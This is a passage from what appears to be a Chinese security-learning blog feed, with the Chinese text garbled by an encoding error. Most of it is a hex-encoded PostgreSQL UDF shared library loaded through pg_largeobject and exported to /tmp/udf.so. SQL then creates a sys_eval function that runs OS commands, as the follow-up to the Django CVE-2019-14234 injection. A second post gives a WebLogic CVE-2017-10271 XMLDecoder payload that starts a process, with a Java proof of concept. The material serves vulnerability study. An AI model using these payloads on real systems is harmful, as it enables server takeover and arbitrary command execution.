class="string">'45ec488b45f84889c7e832fcffff488b45d8488b4020483b45f0740c488b45f04889c7e868fdffff8b45ec489889c0c9c3554889e5488d05a40400005dc3554889e54883ec5048897db8488b45b8488b40204889c7e8b6fcffff488945d8488b45d84889c7e876fcffff488945e0bf00040000e8a8fcffff488945e8bf01000000e89afcffff488945d0c745c800000000488b45d0c60000488b45e0488d350d0400004889c7e8b5fcffff488945f0eb55488b45e84889c7e8c3fbffff8945cc8b55c88b45cc01d04863d0488b45d04889d64889c7e866fcffff488945d08b45cc4863d08b45c84863c8488b45d04801c1488b45e84889c64889cfe850fbffff8b45cc0145c8488b55f0488b45e8be080000004889c7e8b5fbffff4885c07591488b45f04889c7e894fbffff488b45d00fb60084c074138b45c84898488d50ff488b45d04801d0c60000488b45d04889c7e85afcffff488945f8488b45f8c9c3554889e5488d05790300005dc3554889e54883ec4048897dc8488b45c8488b40204889c7e887fbffff488945e0488b45e08b00c1e80283e8048945d88b45d84898488945e8e8f6fbffff8945dc837ddc00790ab801000000e9ae000000837ddc000f8585000000bf1e000000e8affbffff4883e801488945f0488b55e8488b45f04801c2488b45f048f7d04821d0488945f0488b45f041b90000000041b800000000b921000000ba070000004889c6bf00000000e887faffff488945f848837df8ff7507b801000000eb40488b45e0488d4804488b55e8488b45f84889ce4889c7e80afaffff488b45f8ffd0837ddc007e148b45dcba01000000be0000000089c7e8eafaffffb800000000c9c3554889e5488d05700200005dc3554889e54883ec7048897d9864488b042528000000488945f831c0488b4598488b40204889c7e86bfaffff488945b048b83031323334353637488945e048b83839414243444546488945e8c645f000488b45b04889c7e80bfaffff488945b8488b45b8488d35ce0100004889c7e884faffff488945c048837dc0007512488b4598c6401c01b800000000e97f010000488b45c0ba02000000be000000004889c7e811faffff488b45c04889c7e8c5f9ffff8945ac488b45c0ba00000000be000000004889c7e8ecf9ffff8b45ac83c00148984889c7e8ccf9ffff488945c848837dc800751e488b45c04889c7e805f9ffff488b4598c6401c01b800000000e90b0100008b45ac4863f0488b55c0488b45c84889d1ba010000004889c7e8c5f8ffff488b45c04889c7e8c9f8ffff8b45ac01c083c00148984889c7e867f9ffff488945d0c745a400000000c745a800000000eb6b8b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb600c0f8040fbec083e00f48980fb64405e088028b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb6000fbec083e00f48980fb64405e088028345a4018b45a43b45ac7c8d8b45a84863d0488b45d04801d0c60000488b45d04889c7e854f9ffff488945d8488b45d04889c7e8d4f7ffff488b45c84889c7e8c8f7ffff488b45b84889c7e8bcf7ffff488b45d8488b4df86448330c25280000007405e8f4f7ffffc9c300004883ec084883c408c300000000000000720072620000000000000000000000001c0000008a030000640000002000000040000000010000000100000001000000010000000100000001000000011b033b680000000c00000044f7ffff84000000e4f9ffffac000000f1f9ffffcc00000053faffffec000000c3faffff0c010000d0faffff2c01000045fbffff4c01000052fbffff6c01000074fcffff8c01000081fcffffac01000081fdffffcc0100008efdffffec0100001400000000000000017a5200017810011b0c070890010000240000001c000000b8f6ffff90010000000e10460e184a0f0b770880003f1a3b2a332422000000001c0000004400000030f9ffff0d00000000410e108602430d06480c07080000001c000000640000001df9ffff6200000000410e108602430d06025d0c070800001c000000840000005ff9ffff7000000000410e108602430d06026b0c070800001c000000a4000000aff9ffff0d00000000410e108602430d06480c07080000001c000000c40000009cf9ffff7500000000410e108602430d0602700c070800001c000000e4000000f1f9ffff0d00000000410e108602430d06480c07080000001c00000004010000def9ffff2201000000410e108602430d06031d010c0708001c00000024010000e0faffff0d00000000410e108602430d06480c07080000001c00000044010000cdfaffff0001000000410e108602430d0602fb0c070800001c00000064010000adfbffff0d00000000410e108602430d06480c07080000001c000000840100009afbffff2402000000410e108602430d06031f020c070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="string">'000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00e000000000000600e000000000000000000000000000001000000000000009b010000000000000c00000000000000100c0000000000000d00000000000000a0140000000000001900000000000000001e2000000000001b0000000000000008000000000000001a00000000000000081e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000009806000000000000060000000000000060020000000000000a00000000000000de010000000000000b0000000000000018000000000000000300000000000000002020000000000002000000000000004002000000000000140000000000000007000000000000001700000000000000d009000000000000070000000000000010090000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f00000000d008000000000000ffffff6f000000000100000000000000f0ffff6f000000007608000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">4</span>, <span class="keyword">decode</span>(<span class="string">'181e20000000000000000000000000000000000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c000000000000060d000000000000160d000000000000260d000000000000360d000000000000460d000000000000560d000000000000660d000000000000760d000000000000860d000000000000960d000000000000a60d000000000000b60d000000000000d8202000000000004743433a20285562756e747520352e342e302d367562756e7475317e31362e30342e31312920352e342e30203230313630363039000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300600200000000000000000000000000000000000003000400980600000000000000000000000000000000000003000500760800000000000000000000000000000000000003000600d00800000000000000000000000000000000000003000700100900000000000000000000000000000000000003000800d00900000000000000000000000000000000000003000900100c00000000000000000000000000000000000003000a00300c00000000000000000000000000000000000003000b00c00d00000000000000000000000000000000000003000c00d00d00000000000000000000000000000000000003000d00a01400000000000000000000000000000000000003000e00b01400000000000000000000000000000000000003000f00ec1400000000000000000000000000000000000003001000581500000000000000000000000000000000000003001100001e20000000000000000000000000000000000003001200081e20000000000000000000000000000000000003001300101e20000000000000000000000000000000000003001400181e20000000000000000000000000000000000003001500d81f20000000000000000000000000000000000003001600002020000000000000000000000000000000000003001700d82020000000000000000000000000000000000003001800e0202000000000000000000000000000000000000300190000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001300101e20000000000000000000000000001900000002000c00d00d00000000000000000000000000001b00000002000c00100e00000000000000000000000000002e00000002000c00600e00000000000000000000000000004400000001001800e02020000000000001000000000000005300000001001200081e20000000000000000000000000007a00000002000c00a00e00000000000000000000000000008600000001001100001e2000000000000000000000000000a50000000400f1ff00000000000000000000000000000000bd00000001000e00c0140000000000001c00000000000000d000000001000e00dc140000000000000400000000000000de00000001000e00e0140000000000000400000000000000ec00000001000e00e4140000000000000400000000000000fa00000001000e00e8140000000000000400000000000000010000000400f1ff000000000000000000000000000000000801000001001000f81600000000000000000000000000001601000001001300101e2000000000000000000000000000000000000400f1ff000000000000000000000000000000002201000001001700d82020000000000000000000000000002f01000001001400181e20000000000000000000000000003801000000000f00ec1400000000000000000000000000004b01000001001700e02020000000000000000000000000005701000001001600002020000000000000000000000000006d01000012000000000000000000000000000000000000007f01000012000c00d00e0000000000000d000000000000008d0100001200000000000000000000000000000000000000a20100002000000000000000000000000000000000000000be01000012000c0060110000000000000d00000000000000d301000012000c0031100000000000000d00000000000000e501000012000000000000000000000000000000000000009f02000012000c00bc0f0000000000007500000000000000f801000010001700e0202000000000000000000000000000ff01000012000000000000000000000000000000000000001302000012000d00a01400000000000000000000000000001902000012000000000000000000000000000000000000002d02000012000000000000000000000000000000000000004902000012000000000000000000000000000000000000005b02000012000000000000000000000000000000000000006f02000012000000000000000000000000000000000000008302000012000000000000000000000000000000000000009602000012000c00af0f0000000000000d00000000000000a802000012000c00dd0e0000000000006200000000000000dc01000012000c003e100000000000002201000000000000bd0200001200000000000000000000000000000000000000d00200002000000000000000000000000000000000000000df0200001200000000000000000000000000000000000000f2020000100000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">5</span>, <span class="keyword">decode</span>(<span class="string">'00000000000000000303000012000000000000000000000000000000000000001703000010001800e82020000000000000000000000000001c03000012000000000000000000000000000000000000002f03000012000000000000000000000000000000000000004403000010001800e02020000000000000000000000000005003000012000000000000000000000000000000000000006503000012000000000000000000000000000000000000007803000012000000000000000000000000000000000000008b0300001200000000000000000000000000000000000000a00300002000000000000000000000000000000000000000b403000020000000000000000000000000000000000000001104000012000c007a120000000000002402000000000000ce0300002200000000000000000000000000000000000000ea03000012000900100c0000000000000000000000000000f00300001000000000000000000000000000000000000000c701000012000c006d110000000000000001000000000000f603000012000000000000000000000000000000000000000804000012000c006d120000000000000d000000000000001e04000012000c003f0f00000000000070000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37353934005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f706f737467726573716c7564665f7379732e630050675f6d616769635f646174612e35383133006d795f66696e666f2e35383331006d795f66696e666f2e35383436006d795f66696e666f2e35383639006d795f66696e666f2e35383838005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00667265654040474c4942435f322e322e350050675f6d616769635f66756e63007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c650070675f66696e666f5f7379735f62696e6576616c0070675f66696e666f5f7379735f6576616c0066726561644040474c4942435f322e322e35005f65646174610066636c6f73654040474c4942435f322e322e35005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e34006d6d61704040474c4942435f322e322e350073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e350070675f66696e666f5f7379735f6578656300746578745f7074725f746f5f636861725f707472006674656c6c4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f006d656d6370794040474c4942435f322e31340070675f6465746f6173745f646174756d006d616c6c6f634040474c4942435f322e322e35005f656e6400667365656b4040474c4942435f322e322e35007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400776169747069644040474c4942435f322e322e3500706f70656e4040474c4942435f322e322e3500666f70656e4040474c4942435f322e322e3500737973636f6e664040474c4942435f322e322e35005f4a765f5265676973746572436c6173736573005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e697400706672656500666f726b4040474c4942435f322e322e350070675f66696e666f5f7379735f66696c6572656164006368725f7074725f746f5f746578745f70747200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000380000000b00000002000000000000006002000000000000600200000000000038040000000000000400000002000000080000000000000018000000000000004000000003000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">6</span>, <span class="keyword">decode</span>(<span class="string">'020000000000000098060000000000009806000000000000de0100000000000000000000000000000100000000000000000000000000000048000000ffffff6f0200000000000000760800000000000076080000000000005a0000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000d008000000000000d00800000000000040000000000000000400000001000000080000000000000000000000000000006400000004000000020000000000000010090000000000001009000000000000c0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000d009000000000000d009000000000000400200000000000003000000160000000800000000000000180000000000000078000000010000000600000000000000100c000000000000100c0000000000001a0000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000300c000000000000300c00000000000090010000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c00d000000000000c00d000000000000100000000000000000000000000000000800000000000000000000000000000087000000010000000600000000000000d00d000000000000d00d000000000000ce060000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000a014000000000000a014000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000b014000000000000b0140000000000003c000000000000000000000000000000100000000000000000000000000000009b000000010000000200000000000000ec14000000000000ec140000000000006c00000000000000000000000000000004000000000000000000000000000000a900000001000000020000000000000058150000000000005815000000000000a401000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000bf0000000f0000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000cb000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000d0000000060000000300000000000000181e200000000000181e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d900000001000000030000000000000000202000000000000020000000000000d800000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000d820200000000000d8200000000000000800000000000000000000000000000008000000000000000000000000000000e8000000080000000300000000000000e020200000000000e0200000000000000800000000000000000000000000000001000000000000000000000000000000ed0000000100000030000000000000000000000000000000e0200000000000003500000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000022e000000000000f6000000000000000000000000000000010000000000000000000000000000000100000002000000000000000000000000000000000000001821000000000000b8080000000000001c0000003200000008000000000000001800000000000000090000000300000000000000000000000000000000000000d0290000000000003204000000000000000000000000000001000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">'/tmp/udf.so'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> sys_eval(<span class="built_in">text</span>) <span class="keyword">RETURNS</span> <span class="built_in">text</span> <span class="keyword">AS</span> <span class="string">'/tmp/udf.so'</span>, <span class="string">'sys_eval'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> <span class="keyword">INPUT</span> IMMUTABLE;  <span class="comment">#æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval(<span class="built_in">text</span>);  <span class="comment">#åˆ é™¤å‡½æ•°</span></span><br></pre></td></tr></table></figure></div><h2 id="çæ‰¯ä¸€ä¼š"><a href="#çæ‰¯ä¸€ä¼š" class="headerlink" title="çæ‰¯ä¸€ä¼š"></a>çæ‰¯ä¸€ä¼š</h2><p>è¿™ä¸ªCVEè¿˜æœ‰å¾ˆå¤šè¦å­¦ä¹ çš„ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œåé¢å»èŠ±äº›æ—¶é—´äº†è§£ä¸€ä¸‹ <code>jsonField</code><br>(ps: è‡ªå·±æŒ–çš„å‘è¶Šæ¥è¶Šå¤šäº†)</p><p>å¼€å­¦äº†ï¼Œæ¯å¤©æœ€è¿‘å› ä¸ºä¸€äº›æ–°çš„è€ƒç ”æ”¿ç­–å‡ºå°ï¼Œæå¾—è‡ªå·±æœ‰äº›ç„¦è™‘æ€¥èºï¼Œæ…¢æ…¢é™ä¸‹å¿ƒæ¥å¥½å¥½å‡†å¤‡å§ã€‚</p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">CVE-2019-14234 Django JSON SQLæ³¨å…¥ åˆ†æ</a><br><a href="https://www.leavesongs.com/penetration/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">Django JSONField SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2019-14234ï¼‰åˆ†æä¸å½±å“</a><br><a href="https://blog.csdn.net/qq_41420747/article/details/103539487" target="_blank" rel="noopener">CVE-2019-14234ç¬”è®°</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨ &lt;code&gt;Django 1.11.x&lt;/code&gt;ï¼ˆ1.11.23ä¹‹å‰ï¼‰ï¼Œ2.1.xï¼ˆ2.1.11ä¹‹å‰ï¼‰å’Œ2.2.xï¼ˆ2.2.4ä¹‹å‰ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªé—®é¢˜ã€‚ ç”±äº&lt;code&gt;shallow key&lt;/code&gt;è½¬æ¢ä¸­çš„é”™è¯¯ï¼Œ&lt;code&gt;django.contrib.postgres.fields.JSONField&lt;/code&gt; çš„å…³é”®å­—å’Œç´¢å¼•æŸ¥æ‰¾ä»¥åŠ &lt;code&gt;django.contrib.postgres.fields.HStoreField&lt;/code&gt; çš„å…³é”®å­—æŸ¥æ‰¾å—åˆ°SQLæ³¨å…¥ã€‚ &lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="æ¸—é€" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-10271æ¼æ´å­¦ä¹ </title>
    <link href="https://manayakko.github.io/yakko117/2020/02/16/cve_2017_10271/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/16/cve_2017_10271/</id>
    <published>2020-02-16T14:07:56.135Z</published>
    <updated>2020-02-16T13:17:19.194Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>Weblogicæ˜¯oracleæ¨å‡ºçš„application serverï¼Œç”±äºå…¶å…·æœ‰æ”¯æŒEJBã€JSPã€JMSã€XMLç­‰å¤šç§è¯­è¨€ã€å¯æ‰©å±•æ€§ã€å¿«é€Ÿå¼€å‘ç­‰å¤šç§ç‰¹æ€§ï¼Œå¤‡å—å¹¿å¤§ç³»ç»Ÿç®¡ç†å‘˜çš„é’çã€‚æ ¹æ®ä¸å®Œå…¨ç»Ÿè®¡weblogicçº¦å å…¨çƒå¸‚åœºä»½é¢1/3ï¼Œæ­£å› ä¸ºè¿™ä¹ˆé«˜çš„å æœ‰ç‡ï¼Œä¹Ÿé€ æˆæ¯æ¬¡weblogicæœ‰æ–°çš„æ¼æ´ï¼Œéƒ½ä¼šåœ¨ä¸šå†…å¼•èµ·è½©ç„¶å¤§æ³¢ã€‚åœ¨2017å¹´æ¥è¿‘å°¾å£°æ—¶ï¼Œweblogicåˆå†æ¬¡ç»™å¤§å®¶å¸¦æ¥äº†å·¨å¤§æƒŠå–œï¼ŒCVE-2017-10271æ¼æ´åˆä¸€æ¬¡å¸­å·äº†æ”¿åºœã€é“¶è¡Œç­‰å„å¤§è¡Œä¸šã€‚</p><a id="more"></a><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p><code>CVE-2017-10271</code>æ¼æ´ä¸»è¦æ˜¯ç”±<code>WebLogic Server WLS</code>ç»„ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´<br>ç”± <code>wls-wsat.war</code> è§¦å‘è¯¥æ¼æ´ï¼Œè§¦å‘æ¼æ´urlå¦‚ä¸‹ï¼š<br><code>http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType</code><br>é€šè¿‡ postæ•°æ®åŒ…ï¼Œæ„é€  <code>SOAPï¼ˆXMLï¼‰</code> æ ¼å¼çš„è¯·æ±‚ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å¯¼è‡´ <code>XMLDecoderååºåˆ—åŒ–</code> æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><hr><h2 id="æµ‹è¯•è„šæœ¬"><a href="#æµ‹è¯•è„šæœ¬" class="headerlink" title="æµ‹è¯•è„šæœ¬"></a>æµ‹è¯•è„šæœ¬</h2><p>ç®€å•å¼¹ä¸ªè®¡ç®—å™¨ï¼Œåˆ›å»ºä¸ª <code>ts.xml</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"13.0.2"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>ç„¶ååˆ©ç”¨ <code>Poc.java</code> ï¼Œå®ç°æ¼æ´å¤ç°</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XMLDecoderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        java.io.File file = <span class="keyword">new</span> java.io.File(<span class="string">"pathname: xx/xx/xx/ts.xml"</span>);</span><br><span class="line"></span><br><span class="line">        java.beans.XMLDecoder xd = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xd = <span class="keyword">new</span> java.beans.XMLDecoder(<span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Object s2 = xd.readObject();</span><br><span class="line">        xd.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6u7thj30wy0jfk95.jpg" class="lazyload"></a></p><hr><h1 id="é¶æœºæµ‹è¯•"><a href="#é¶æœºæµ‹è¯•" class="headerlink" title="é¶æœºæµ‹è¯•"></a>é¶æœºæµ‹è¯•</h1><p>å› ä¸ºæ²¡æœ‰æ‰¾åˆ°è€ç‰ˆæœ¬çš„weblogicï¼Œåªå¥½ç”¨pç¥çš„vulhubæ¥å¤ç°æµ‹è¯•ä¸€ä¸‹</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6qgl7j30mk0ehagp.jpg" class="lazyload"></a></p><hr><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è®¿é—® <code>http://your-ip:7001/wls-wsat/CoordinatorPortType11</code> å­˜åœ¨ä¸‹é¢è¿™ç§æƒ…å†µ</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" 